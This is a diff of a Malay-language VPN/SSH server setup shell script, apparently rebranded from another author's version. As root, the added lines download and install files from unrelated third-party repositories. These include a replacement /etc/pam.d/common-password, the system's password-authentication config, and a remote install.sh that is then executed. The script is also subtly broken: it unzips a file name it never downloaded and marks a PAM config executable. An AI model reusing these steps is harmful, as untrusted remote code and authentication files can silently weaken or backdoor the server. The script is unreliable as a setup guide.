@@ -1,4 +1,7 @@
 #!/bin/bash
+SSH_Port1='22'
+SSH_Port2='225'
+SSH_Banner='https://gakod.com/banner'
 # ******************************************
 # Program: inject69 Servis inject69 2017
 # Website: inject69.tk
@@ -22,30 +25,18 @@ if [[ ! -e /dev/net/tun ]]; then
 echo "TUN is not available"
 exit 3
 fi
-# Getting some OpenVPN plugins for unix authentication
-cd
-wget https://github.com/korn-sudo/Project-Fog/raw/main/files/plugins/plugin.tgz
-tar -xzvf /root/plugin.tgz -C /etc/openvpn/
-rm -f plugin.tgz
-SSH_Port1='22'
-SSH_Port2='225'
-SSH_Banner='https://gakod.com/banner'
 echo "
-AUTOSCRIPT BY RANGERSVPN
-
-PLEASE CANCEL ALL PACKAGE POPUP
-
-TAKE NOTE !!!"
+AUTOSCRIPT BY AUTOSCRIPTNOBITA.TK
+AMBIL PERHATIAN !!!"
 clear
-echo "START AUTOSCRIPT"
+echo "MULA SETUP"
 clear
 echo "SET TIMEZONE KUALA LUMPUT GMT +8"
 ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
 clear
 echo "
 ENABLE IPV4 AND IPV6
-
-COMPLETE 1%
+SILA TUNGGU SEDANG DI SETUP
 "
 echo ipv4 >> /etc/modules
 echo ipv6 >> /etc/modules
@@ -55,23 +46,37 @@ sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc
 sysctl -p
 clear
 echo "
-REMOVE SPAM PACKAGE
-
-COMPLETE 10%
+MEMBUANG SPAM PACKAGE
 "
 apt-get -y --purge remove samba*;
 apt-get -y --purge remove apache2*;
 apt-get -y --purge remove sendmail*;
 apt-get -y --purge remove postfix*;
 apt-get -y --purge remove bind*;
-apt-get -y install wget curl
-
 clear
 echo "
-UPDATE AND UPGRADE PROCESS
-
-PLEASE WAIT TAKE TIME 1-5 MINUTE
 "
+sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
+wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
+apt-get update;
+apt-get -y autoremove;
+apt-get -y install wget curl;
+echo "
+"
+# update
+apt update && apt upgrade -y
+
+# script
+wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/macisvpn/premiumnow/master/common-password"
+chmod +x /etc/pam.d/common-password
+# Install Dos Deflate
+apt-get -y install dnsutils dsniff
+wget https://raw.githubusercontent.com/tinasetina/9/master/ddos-deflate-master.zip
+unzip master.zip
+cd ddos-deflate-master
+./install.sh
+cd
+service exim4 stop;sysv-rc-conf exim4 off;
 # set repo
 echo 'deb http://download.webmin.com/download/repository sarge contrib' >> /etc/apt/sources.list.d/webmin.list
 wget "http://www.dotdeb.org/dotdeb.gpg"
